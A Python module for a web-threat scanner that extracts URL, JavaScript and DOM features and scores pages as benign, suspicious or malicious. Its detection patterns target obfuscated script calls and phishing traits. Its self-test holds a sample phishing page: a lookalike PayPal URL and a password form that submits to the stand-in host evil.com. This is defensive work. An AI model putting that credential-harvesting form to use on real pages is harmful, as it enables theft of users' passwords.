"""
LAYER E: ENHANCED MACHINE LEARNING
Extended ML features and advanced classification
"""

import re
import math
from urllib.parse import urlparse, parse_qs
from collections import Counter
from typing import Dict, List

class EnhancedMLAnalyzer:
    """
    Enhanced ML-based analysis with expanded feature extraction
    Extends the existing SimpleMalwareDetector with additional features
    """
    
    def __init__(self, base_ml_detector=None):
        """
        Initialize with optional base ML detector
        
        Args:
            base_ml_detector: Existing SimpleMalwareDetector instance
        """
        self.base_detector = base_ml_detector
        self.findings = []
        self.ml_confidence = 0.0
    
    def analyze(self, url: str, page_data: dict = None) -> dict:
        """
        Perform enhanced ML analysis
        
        Args:
            url: URL to analyze
            page_data: Page content data
        
        Returns:
            dict: ML predictions and confidence scores
        """
        self.findings = []
        self.ml_confidence = 0.0
        
        try:
            # Extract enhanced features
            features = self._extract_enhanced_features(url, page_data)
            
            # Run base ML model if available
            base_prediction = None
            if self.base_detector:
                try:
                    base_prediction = self.base_detector.classify(
                        self._convert_to_base_features(features)
                    )
                except Exception as e:
                    self.findings.append(f"Base ML model error: {str(e)}")
            
            # Run heuristic classification on enhanced features
            heuristic_prediction = self._heuristic_classification(features)
            
            # Combine predictions
            final_prediction = self._combine_predictions(base_prediction, heuristic_prediction)
            
            return {
                'ml_confidence': round(self.ml_confidence, 2),
                'prediction': final_prediction['classification'],
                'risk_score': final_prediction['risk_score'],
                'findings': self.findings,
                'features': {
                    'url_features': features['url_features'],
                    'js_features': features['js_features'],
                    'dom_features': features['dom_features']
                },
                'status': 'completed'
            }
            
        except Exception as e:
            return {
                'ml_confidence': 0,
                'prediction': 'UNKNOWN',
                'risk_score': 0,
                'findings': [f"ML analysis error: {str(e)}"],
                'status': 'error'
            }
    
    def _extract_enhanced_features(self, url: str, page_data: dict = None) -> Dict:
        """Extract comprehensive feature set"""
        features = {
            'url_features': self._extract_url_features(url),
            'js_features': {},
            'dom_features': {},
            'behavioral_features': {}
        }
        
        if page_data:
            features['js_features'] = self._extract_js_features(page_data.get('scripts', []))
            features['dom_features'] = self._extract_dom_features(page_data.get('html', ''))
            features['behavioral_features'] = self._extract_behavioral_features(page_data)
        
        return features
    
    def _extract_url_features(self, url: str) -> Dict:
        """Extract URL-specific features"""
        parsed = urlparse(url)
        domain = parsed.netloc
        path = parsed.path
        query = parsed.query
        
        return {
            # Length features
            'url_length': len(url),
            'domain_length': len(domain),
            'path_length': len(path),
            'query_length': len(query),
            
            # Character features
            'digit_ratio': sum(c.isdigit() for c in url) / max(len(url), 1),
            'letter_ratio': sum(c.isalpha() for c in url) / max(len(url), 1),
            'special_char_ratio': sum(not c.isalnum() for c in url) / max(len(url), 1),
            
            # Pattern features
            'dot_count': url.count('.'),
            'hyphen_count': url.count('-'),
            'underscore_count': url.count('_'),
            'slash_count': url.count('/'),
            'question_count': url.count('?'),
            'ampersand_count': url.count('&'),
            'at_symbol': 1 if '@' in url else 0,
            
            # Security features
            'has_https': 1 if parsed.scheme == 'https' else 0,
            'has_port': 1 if ':' in domain and not domain.endswith(':443') and not domain.endswith(':80') else 0,
            'is_ip_address': 1 if re.match(r'^\d+\.\d+\.\d+\.\d+', domain) else 0,
            
            # Subdomain features
            'subdomain_count': domain.count('.') - 1 if '.' in domain else 0,
            'subdomain_length': len(domain.split('.')[0]) if '.' in domain else 0,
            
            # Entropy
            'url_entropy': self._calculate_entropy(url),
            'domain_entropy': self._calculate_entropy(domain),
            
            # TLD features
            'tld': domain.split('.')[-1] if '.' in domain else '',
            'tld_length': len(domain.split('.')[-1]) if '.' in domain else 0,
            
            # Query parameters
            'query_param_count': len(parse_qs(query)),
            
            # Suspicious patterns
            'has_suspicious_keywords': self._has_suspicious_keywords(url),
            'has_brand_name': self._has_brand_name(url)
        }
    
    def _extract_js_features(self, scripts: List[Dict]) -> Dict:
        """Extract JavaScript structural features"""
        if not scripts:
            return {'script_count': 0}
        
        all_js = ' '.join(s.get('content', '') for s in scripts)
        
        # Suspicious function patterns
        suspicious_functions = {
            'eval': len(re.findall(r'\beval\s*\(', all_js)),
            'Function': len(re.findall(r'\bFunction\s*\(', all_js)),
            'atob': len(re.findall(r'\batob\s*\(', all_js)),
            'btoa': len(re.findall(r'\bbtoa\s*\(', all_js)),
            'unescape': len(re.findall(r'\bunescape\s*\(', all_js)),
            'String.fromCharCode': len(re.findall(r'String\.fromCharCode', all_js)),
            'setTimeout': len(re.findall(r'\bsetTimeout\s*\(', all_js)),
            'setInterval': len(re.findall(r'\bsetInterval\s*\(', all_js)),
            'document.write': len(re.findall(r'document\.write', all_js)),
            'createElement': len(re.findall(r'createElement', all_js)),
            'appendChild': len(re.findall(r'appendChild', all_js))
        }
        
        # Calculate obfuscation score
        obfuscation_score = (
            suspicious_functions['eval'] * 3 +
            suspicious_functions['Function'] * 3 +
            suspicious_functions['atob'] * 2 +
            suspicious_functions['String.fromCharCode'] * 2
        ) / max(len(all_js), 1) * 1000
        
        return {
            'script_count': len(scripts),
            'total_js_length': len(all_js),
            'avg_script_length': len(all_js) / len(scripts) if scripts else 0,
            'suspicious_functions': suspicious_functions,
            'obfuscation_score': obfuscation_score,
            'js_entropy': self._calculate_entropy(all_js[:10000]),  # First 10KB
            'has_external_scripts': sum(1 for s in scripts if s.get('src')),
            'has_inline_scripts': sum(1 for s in scripts if not s.get('src'))
        }
    
    def _extract_dom_features(self, html: str) -> Dict:
        """Extract DOM structural features"""
        if not html:
            return {}
        
        return {
            'html_length': len(html),
            
            # Element counts
            'iframe_count': len(re.findall(r'<iframe', html, re.IGNORECASE)),
            'form_count': len(re.findall(r'<form', html, re.IGNORECASE)),
            'input_count': len(re.findall(r'<input', html, re.IGNORECASE)),
            'script_tag_count': len(re.findall(r'<script', html, re.IGNORECASE)),
            'link_count': len(re.findall(r'<a\s+[^>]*href', html, re.IGNORECASE)),
            'img_count': len(re.findall(r'<img', html, re.IGNORECASE)),
            
            # Suspicious patterns
            'hidden_elements': len(re.findall(r'display:\s*none|visibility:\s*hidden', html, re.IGNORECASE)),
            'password_inputs': len(re.findall(r'type=["\']password["\']', html, re.IGNORECASE)),
            'external_forms': len(re.findall(r'<form[^>]*action=["\']https?://', html, re.IGNORECASE)),
            
            # Meta tags
            'has_meta_refresh': 1 if re.search(r'<meta[^>]*http-equiv=["\']refresh', html, re.IGNORECASE) else 0,
            'has_viewport': 1 if 'viewport' in html.lower() else 0,
            
            # Event handlers
            'event_handler_count': len(re.findall(r'on(load|error|click|focus|blur|change)\s*=', html, re.IGNORECASE))
        }
    
    def _extract_behavioral_features(self, page_data: dict) -> Dict:
        """Extract behavioral indicators"""
        return {
            'redirect_count': page_data.get('redirects', 0),
            'load_time': page_data.get('load_time', 0),
            'resource_count': len(page_data.get('resources', [])),
            'third_party_requests': len([r for r in page_data.get('resources', []) if self._is_third_party(r)])
        }
    
    def _heuristic_classification(self, features: Dict) -> Dict:
        """Rule-based classification on enhanced features"""
        risk_score = 0
        classification = 'BENIGN'
        
        url_f = features['url_features']
        js_f = features.get('js_features', {})
        dom_f = features.get('dom_features', {})
        
        # URL-based scoring
        if url_f.get('is_ip_address') == 1:
            risk_score += 25
            self.findings.append("URL uses IP address instead of domain")
        
        if url_f.get('url_length', 0) > 150:
            risk_score += 15
            self.findings.append(f"Extremely long URL ({url_f['url_length']} chars)")
        
        if url_f.get('url_entropy', 0) > 4.5:
            risk_score += 12
            self.findings.append(f"High URL entropy ({url_f['url_entropy']:.2f})")
        
        if url_f.get('has_suspicious_keywords'):
            risk_score += 10
            self.findings.append("URL contains suspicious keywords")
        
        # JavaScript-based scoring
        if js_f.get('obfuscation_score', 0) > 5:
            risk_score += 20
            self.findings.append(f"High JavaScript obfuscation score ({js_f['obfuscation_score']:.1f})")
        
        eval_count = js_f.get('suspicious_functions', {}).get('eval', 0)
        if eval_count > 3:
            risk_score += 15
            self.findings.append(f"Excessive eval() usage ({eval_count} times)")
        
        # DOM-based scoring
        if dom_f.get('hidden_elements', 0) > 5:
            risk_score += 12
            self.findings.append(f"Many hidden elements ({dom_f['hidden_elements']})")
        
        if dom_f.get('password_inputs', 0) > 0 and dom_f.get('external_forms', 0) > 0:
            risk_score += 18
            self.findings.append("Password form submitting to external domain")
        
        # Classification
        if risk_score >= 70:
            classification = 'MALICIOUS'
        elif risk_score >= 40:
            classification = 'SUSPICIOUS'
        else:
            classification = 'BENIGN'
        
        self.ml_confidence = min(95, risk_score + 20)
        
        return {
            'classification': classification,
            'risk_score': min(100, risk_score)
        }
    
    def _combine_predictions(self, base_pred: dict, heuristic_pred: dict) -> dict:
        """Combine base ML and heuristic predictions"""
        if base_pred:
            # Weight: 60% base model, 40% heuristics
            combined_risk = (
                base_pred.get('total_risk_score', 0) * 0.6 +
                heuristic_pred['risk_score'] * 0.4
            )
            
            # Use base model classification if high confidence
            if base_pred.get('confidence', 0) > 0.8:
                classification = base_pred['classification']
            else:
                classification = heuristic_pred['classification']
        else:
            # Use heuristics only
            combined_risk = heuristic_pred['risk_score']
            classification = heuristic_pred['classification']
        
        return {
            'classification': classification,
            'risk_score': round(combined_risk, 2)
        }
    
    def _convert_to_base_features(self, enhanced_features: Dict) -> Dict:
        """Convert enhanced features to base ML format"""
        url_f = enhanced_features['url_features']
        return {
            'url_length': url_f['url_length'],
            'domain_length': url_f['domain_length'],
            'path_length': url_f['path_length'],
            'dots_count': url_f['dot_count'],
            'hyphens_count': url_f['hyphen_count'],
            'has_https': url_f['has_https'],
            'is_ip': url_f['is_ip_address'],
            'entropy': url_f['url_entropy'],
            'has_suspicious': url_f['has_suspicious_keywords']
        }
    
    def _calculate_entropy(self, text: str) -> float:
        """Calculate Shannon entropy"""
        if not text:
            return 0.0
        
        counter = Counter(text)
        length = len(text)
        entropy = -sum((count/length) * math.log2(count/length) for count in counter.values())
        return round(entropy, 3)
    
    def _has_suspicious_keywords(self, url: str) -> int:
        """Check for suspicious keywords in URL"""
        keywords = ['login', 'signin', 'verify', 'account', 'secure', 'update', 'confirm']
        return 1 if any(kw in url.lower() for kw in keywords) else 0
    
    def _has_brand_name(self, url: str) -> int:
        """Check for brand names in URL"""
        brands = ['paypal', 'amazon', 'google', 'microsoft', 'apple', 'facebook']
        url_lower = url.lower()
        for brand in brands:
            if brand in url_lower and not url_lower.startswith(f'https://{brand}.com'):
                return 1
        return 0
    
    def _is_third_party(self, resource: str) -> bool:
        """Check if resource is from third party"""
        # Simplified check
        return 'http' in resource and 'cdn' not in resource.lower()


# Quick test
if __name__ == "__main__":
    analyzer = EnhancedMLAnalyzer()
    
    test_url = "https://paypal-verify.suspicious-site.tk/login?redirect=http://192.168.1.1"
    test_data = {
        'html': '<form action="https://evil.com"><input type="password"></form>',
        'scripts': [
            {'content': 'eval(atob("malicious")); eval(atob("code"));'}
        ]
    }
    
    result = analyzer.analyze(test_url, test_data)
    print(f"ML Confidence: {result['ml_confidence']}%")
    print(f"Prediction: {result['prediction']}")
    print(f"Risk Score: {result['risk_score']}/100")
    print("\nFindings:")
    for finding in result['findings']:
        print(f"  - {finding}")
